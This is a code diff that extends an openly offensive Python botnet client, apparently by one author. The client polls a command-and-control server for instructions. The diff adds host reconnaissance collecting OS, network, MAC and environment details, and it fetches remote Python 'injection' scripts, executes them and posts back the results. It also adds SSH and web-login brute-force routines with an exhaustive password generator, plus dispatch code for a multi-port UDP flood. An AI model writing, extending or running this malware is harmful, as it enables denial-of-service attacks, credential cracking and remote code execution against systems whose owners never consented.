@@ -20,16 +20,22 @@ Main Features:
     - Periodically polls for instructions (commands, botnet actions)
     - Executes received commands and reports output
     - Supports UDP flood and custom botnet actions
+    - Provides a simple HTTP server for file sharing
+    - Provides system information retrieval
+    - Code injection and
     - Provides file transfer and directory navigation utilities
 
 API Endpoints (default: http://127.0.0.1:5000):
-    /api/registor_target         Register a new target
+    /api/register_target      Register a new target
     /api/ApiCommand/<target>     Get commands for a target
     /api/Apicommand/save_output  Post command output
     /api/BotNet/<target>         Get botnet instructions
-    /api/get_instraction/<target>Get instructions for a target
+    /api/injection/<target>     Get Python script for injection
+    /api/injection_output_save   Save output of executed script
+    /api/lib/<script_name>       Retrieve a Python script from the library
+    /api/get_instruction/<target> Get instructions for a target
 
-Author: (Unknown)
+Author: (OMER KEMAL)
 """
 
 from sys import platform
@@ -38,17 +44,177 @@ import http.server
 import subprocess
 import contextlib
 import threading
+import itertools
+import platform
+import datetime
 import requests
+import paramiko
 import sqlite3
 import logging
 import string
 import random
 import socket
+import uuid
 import time
+import sys
 import io
 import os
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+
+def is_android():
+    """Checks if the current operating system is Android."""
+    return 'ANDROID_ROOT' in os.environ or os.path.exists('/system/build.prop')
+
+def get_os_name():
+    """Returns the name of the operating system."""
+    return "Android" if is_android() else platform.system()
+
+def format_mac(mac_int):
+    """Formats a MAC address from an integer."""
+    return ':'.join(f'{(mac_int >> i) & 0xff:02x}' for i in range(40, -1, -8))
+
+def get_mac_address():
+    """Returns the MAC address of the host."""
+    mac_int = uuid.getnode()
+    is_random = (mac_int >> 40) & 0x02
+    if is_random:
+        return "Could not reliably determine"
+    return format_mac(mac_int)
+
+def get_all_ip_addresses():
+    """Returns a list of all IP addresses associated with the host."""
+    try:
+        return list(set([socket.gethostbyname(socket.gethostname())]))
+    except:
+        return ["Unavailable"]
+
+def get_environment_vars():
+    """Returns a dictionary of selected environment variables."""
+    keys = ['PATH', 'HOME', 'USER', 'SHELL', 'LANG', 'OS', 'COMPUTERNAME', 'ANDROID_ROOT']
+    return {key: os.environ.get(key, "Not set") for key in keys}
+
+def get_cpu_count():
+    """Returns the number of CPU cores available."""
+    return os.cpu_count() or "Unavailable"
+
+def get_memory_info():
+    """Returns total and free memory in MB."""
+    try:
+        with open('/proc/meminfo') as f:
+            lines = f.read().splitlines()
+        total = next(int(x.split()[1]) for x in lines if x.startswith('MemTotal:')) // 1024
+        free = next(int(x.split()[1]) for x in lines if x.startswith('MemFree:')) // 1024
+        return f"{total} MB", f"{free} MB"
+    except:
+        return "Unavailable", "Unavailable"
+
+def get_uptime():
+    try:
+        with open('/proc/uptime') as f:
+            uptime_seconds = float(f.readline().split()[0])
+            return str(datetime.timedelta(seconds=int(uptime_seconds)))
+    except:
+        return "Unavailable"
+
+def get_cpu_info():
+    """Returns the CPU information of the system."""
+    if platform.processor():
+        return platform.processor().strip()
+    try:
+        with open('/proc/cpuinfo') as f:
+            for line in f:
+                if "model name" in line.lower() or "hardware" in line.lower():
+                    return line.split(":", 1)[1].strip()
+    except:
+        pass
+    return "Unavailable"
+
+def format_datetime(dt):
+    """Formats a datetime object into a human-readable string."""
+    return dt.strftime("%Y-%m-%d %H:%M:%S (%A)")
+
+def print_pretty(title, data_dict):
+    """
+    Formats and prints a dictionary in a pretty way.
+    """
+    output = ''
+    print(f"\n===== {title} =====")
+    max_len = max(len(k) for k in data_dict)
+    for key in sorted(data_dict):
+       output+= f"  {key.ljust(max_len)} : {data_dict[key]}\n"
+    return output
+
+def sys_info():
+    """Collects and formats system information including OS, hardware, network, user environment, and date/time.
+    Returns:
+        dict: A dictionary containing formatted system information.
+    """
+    # System Info
+    system_info = {
+        "OS"              : get_os_name(),
+        "Node Name"       : platform.node(),
+        "Release"         : platform.release(),
+        "Version"         : platform.version(),
+        "Machine"         : platform.machine(),
+        "Processor"       : get_cpu_info(),
+        "Architecture"    : ' '.join(platform.architecture()),
+        "Python Version"  : platform.python_version(),
+        "Implementation"  : platform.python_implementation(),
+        "Compiler"        : platform.python_compiler()
+    }
+
+    # Hardware Info
+    total_mem, free_mem = get_memory_info()
+    hardware_info = {
+        "CPU Cores"       : get_cpu_count(),
+        "Memory Total"    : total_mem,
+        "Memory Free"     : free_mem,
+        "System Uptime"   : get_uptime()
+    }
+
+    # Network Info
+    ip_list = get_all_ip_addresses()
+    network_info = {
+        "Hostname"        : socket.gethostname(),
+        "IP Addresses"    : ', '.join(ip_list),
+        "MAC Address"     : get_mac_address()
+    }
+
+    # User & Environment
+    try:
+        user = os.getlogin()
+    except OSError:
+        user = "Unavailable (no tty)"
+    user_env = get_environment_vars()
+    user_env.update({
+        "Current User"    : user,
+        "Current Dir"     : os.getcwd(),
+        "Home Dir"        : os.path.expanduser('~')
+    })
+
+    # Date & Time
+    now = datetime.datetime.now()
+    dt_info = {
+        "Local Time"      : format_datetime(now),
+        "UTC Time"        : format_datetime(datetime.datetime.utcnow())
+    }
+
+    # Output all
+    System_info = print_pretty("System Info", system_info)
+    Hardware_info = print_pretty("Hardware Info", hardware_info)
+    Network_info = print_pretty("Network Info", network_info)
+    User_env = print_pretty("User & Environment", user_env)
+    Dt_info = print_pretty("Date & Time", dt_info)
+
+    return {
+        'System Info': System_info, 
+        'Hardware Info': Hardware_info, 
+        'Network Info': Network_info, 
+        'User & Environment': User_env, 
+        'Date & Time': Dt_info
+    }
+
 
 # os.system("clear")
 def opratingSystem():
@@ -153,7 +319,7 @@ def command_interface(threads):
             break
 
 # udp-flood(socket)
-def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
+def initUdpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
     """
     Initiates a UDP flood attack on the specified target IP with multiple threads.
     Args:
@@ -161,7 +327,7 @@ def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
         THREAD_COUNT (int): Number of threads to use for the flood.
         PACKET_SIZE (int): Size of each UDP packet to send.
     """
-    # deffult port
+    # default ports
     ports = [
         21, # FTP
         22, # SSH
@@ -171,7 +337,7 @@ def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
         80, # HTTP
         110, # POP3
         123, # NTP(UDP)
-        143, # IMAMP
+        143, # IMAP
         161, # SNMP(UDP)
         443, # HTTPS
         445, # SMB
@@ -191,6 +357,7 @@ def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
             b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS-like query
             b"\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00",  # VoIP RTP header
             b"\x00\x00\x00\x00\x00\x00\x00\x00",  # Generic header
+            b"\x01\x02\x03\x04\x05\x06\x07\x08",  # Custom header
         ]
     # Start Threads
     threads = []
@@ -203,7 +370,7 @@ def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
 
 
 # setting varible
-buit_in_command = ['lib','server','excute_code']
+buit_in_command = ['lib','server','excute_code','sys_info']
 apiToken = "GKEGff99ZQo3gR2gCfCaSNCZq5NgvJpe5Byb37mmer8J5FUL4kjkVwuVjfxxghoX0OBREZR7jgweCXuscYKKdeu6bxpyNDsJ65uCmDBN2rap3n5eej3pZPYKR0ROmXkDoA1FWjpCvzPDS3w81fiCMwNxfpqegwMyWvzT5Nr5vlyv7FT9oJKrlVZHutPYuWXbMyss6qWD"
 
 logger = logging.getLogger(__name__)
@@ -267,6 +434,49 @@ def targetData(command, user_name=None, ID=None):
         return data
 
 
+def injection(token,target_name,method='GET'):
+    """
+    Retrieves a Python script from a local API server.
+    Args:
+        token (str): The API token for authentication.
+        target_name (str): The name of the target to retrieve.
+    Returns:
+        dict or str: A dictionary with a message if saved, or the script text if not saved.
+                     Returns 'invalid' if the request fails.
+    """
+    args = {
+            'token': token,
+            'ip': get_ip(),
+            'os': opratingSystem()
+        }
+
+    try:
+        if method.upper() == 'GET':
+            GET = requests.get(f'http://127.0.0.1:5000/api/injection/{target_name}', params=args)
+            response = GET.json()
+            valid = GET.status_code
+
+            if valid == 200:
+                return {'message':response.text}
+
+            return {'message':f'GET request failed with status code {valid}'}
+        elif method.upper() == 'POST':
+            POST = requests.post('http://127.0.0.1:5000/api/injection_output_save', json=args)
+            response = POST.json()
+            valid = POST.status_code
+
+            if valid == 200:
+                return {'message':response.text}
+            return {'message':f'POST request failed with status code {valid}'}
+
+        return {'message':'invalid method'}
+
+    except:
+        return {'message':'Error'}
+
+
+
+
 def libApi(token,usePyload,save=True):
     """
     Retrieves a Python script from a local API server and optionally saves it to a file.
@@ -278,10 +488,15 @@ def libApi(token,usePyload,save=True):
         dict or str: A dictionary with a message if saved, or the script text if not saved.
                      Returns 'invalid' if the request fails.
     """
-    args = {"token": token,'ip': get_ip(),'os':opratingSystem(),'pyload': usePyload}
+    args = {
+            "token": token,
+            'ip': get_ip(),
+            'os': opratingSystem(),
+            'pyload': usePyload
+        }
 
     try:
-        GET = requests.get(f'http://127.0.0.1:5000/api/lib/{usePyload}',params=args)
+        GET = requests.get(f'http://127.0.0.1:5000/api/lib/{usePyload}', params=args)
 
     except:
         return 'Error'
@@ -344,9 +559,13 @@ def CMD(com):
             return code_excuter(com[11:])
         elif com.startswith('server'):
             ...
-        if com.startswith('ls'):
+        elif com.startswith('ls'):
             ls = os.listdir('.')
             return ls
+        elif com.startswith('sys_info'):
+            sys_info_data = sys_info()
+            return sys_info_data
+        
 
 
 
@@ -653,6 +872,63 @@ def socketMain(host,port):
     finally:
         s.close()
 
+# brute force section is not implemented in this code snippet.
+
+def ssh_brute_force(password, host, port=22, username='root'):
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host, port=port, username=username, password=password)
+        print(f"Password found: {password}")
+        return True
+    except paramiko.AuthenticationException:
+        print(f"Failed password: {password}")
+        return False
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+def webLogin(userName,password,userInputName,passwordInputName,url="http://example.com/login"):
+    """
+    Attempts to log in to a web application using the provided username and password.
+    Args:
+        userName (str): The username to use for login.
+        password (str): The password to use for login.
+        userInputName (str): The name attribute of the username input field in the HTML form.
+        passwordInputName (str): The name attribute of the password input field in the HTML form.
+        url (str): The URL of the login page.
+    """
+    session = requests.Session()
+    payload = {userInputName: userName, passwordInputName: password}
+    response = session.post(url, data=payload)
+    if response.status_code == 200:
+        ...
+def password_generator(host, port=22, userInputName=None, passwordInputName=None, userName='admin', length=8, start_index=0, brute_type='ssh'):
+    """
+    Generates all possible combinations of characters for a given length.
+    The characters include uppercase letters, lowercase letters, and digits.
+    """
+    # Define the character sets
+    capital = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+    small = list("abcdefghijklmnopqrstuvwxyz")
+    numbers = list("0123456789")
+    special_chars = list("!@#$%^&*()-_=+[]{}|;:',.<>?/~`")
+
+    all_chars = capital + small + numbers + special_chars  # Combine all characters
+    combinations = itertools.product(all_chars, repeat=length)
+    # calculaing total number of passwords
+    total_passwords = len(all_chars) ** length
+    if brute_type == 'ssh':
+        for index, word in enumerate(itertools.islice(combinations, start_index, None), start=start_index):
+            login = ssh_brute_force("".join(word),host=host,username=userName,port=port) # Print index and word
+            if login:
+                return {'meassege': 'password found','password':''.join(word)}
+    elif brute_type == 'weblogin':
+        for index, word in enumerate(itertools.islice(combinations, start_index, None), start=start_index):
+            if userInputName and passwordInputName:
+                login = webLogin(userName=userName,userInputName=userInputName,password="".join(word),passwordInputName=passwordInputName)
+                if login:
+                    return {'meassege': 'password found','userName':userName,'password':''.join(word)}
+
 def main():
     """
     Main function to handle the API interaction and command execution loop.
@@ -685,25 +961,57 @@ def main():
                     if botNet not in ['error', 'no instraction yet']:
                         udpflood, bruteFroce, customBotNet = botNet
 
-                        if udpflood != 'Inactive':
-                            udpflood()
-                        elif bruteFroce != 'Inactive':
+                        if udpflood['stutas'] != 'Inactive':
+                            # Handle udpflood action
+                            logger.info(f'[botNet] Starting UDP flood with parameters: {udpflood}')
+                            host = botNet['info']['host']
+                            if not host:
+                                logger.info('[botNet Invalid] Host or port not specified for UDP flood')
+                                print({'message':'[botNet Invalid] Host or port not specified for UDP flood'})
+
+                            # Start the UDP flood
+                            logger.info(f'[botNet] Starting UDP flood on {host}')
+                            print(f'[botNet] Starting UDP flood on {host}')
+                            initUdpFlood(TARGET_IP=host, THREAD_COUNT=5, PACKET_SIZE=1024)
+                        elif bruteFroce['stutas'] != 'Inactive':
                             # Handle bruteForce action
-                            pass
-                        elif customBotNet != 'Inactive':
+                            brute_type = bruteFroce['info']['brute_type']
+                            if brute_type == 'ssh':
+                                if bruteFroce['info']['port'] == 'notSet' and bruteFroce['info']['userName'] == 'notSet' and bruteFroce['info']['length']== 'notSet' and bruteFroce['info']['start_index'] == 'netSet':
+                                    password_generator(host=bruteFroce['info']['host'])
+                        elif customBotNet['stutas'] != 'Inactive':
                             # Handle customBotNet action
                             pass
                         else:
                             logger.info('[botNet Invalid] No valid botnet commands')
+                            print({'message':'[botNet Invalid] No valid botnet commands'})
 
                     else:
                         logger.info(f'[botNet Invalid] {botNet}')
-                    return  # Exiting after handling botNet (can be adjusted based on logic)
+                    print({'message':'[botNet Invalid] Exiting after handling botNet'})
 
-                elif instraction['instraction'] == 'excute_code':
-                    pass
+                elif instraction['instraction'] == 'injection':
+                    response = injection(apiToken, target_name)
+                    if response['message'] == 'invalid' or response['message'] == 'Error':
+                        logger.info('[injection Invalid] Failed to retrieve script')
+                        print({'message':'[injection Invalid] Failed to retrieve script'})
+
+                    output = code_excuter(response['message'])
+                    if output == 'Error executing code. Please check the script for errors.':
+                        logger.info('[injection Invalid] Error executing code')
+                        print({'message':'[injection Invalid] Error executing code'})
+                    return_output = injection(token=apiToken, target_name=target_name, method='POST')
+                    if return_output['message'] == 'invalid':
+                        logger.info('[injection Invalid] Failed to post output')
+                        print({'message':'[injection Invalid] Failed to post output'})
+                elif instraction['instraction'] == 'connectToSocket':
+                    host = instraction['host']
+                    port = instraction['port']
+                    socketMain(host=host, port=port)
+
             else:
                 logger.info(f'[apiCommandPost Error] {instraction}')
+                print({'message':f'[apiCommandPost Error] {instraction}'})
 
         else:
             # Handle case where no target info is available
@@ -733,6 +1041,12 @@ def main():
         # print(CMD(com='ls -l'))  # Example command execution
         # Uncomment the line below to enable file transfer functionality
         # send(com='example_file.txt', _port=8080)  # Example file transfer
+        # Uncomment the line below to enable server functionality
+        # server_target(IP='127.0.0.1', PORT=8000)  # Example server start
+        # Uncomment the line below to enable socketMain functionality
+        # socketMain(host='127.0.0.1', PORT=9000)
+        # Uncomment the line below to enable targetData functionality
+        # print(targetData(command='get'))  # Example target data retrieval
 
 if __name__ == '__main__':
     main()
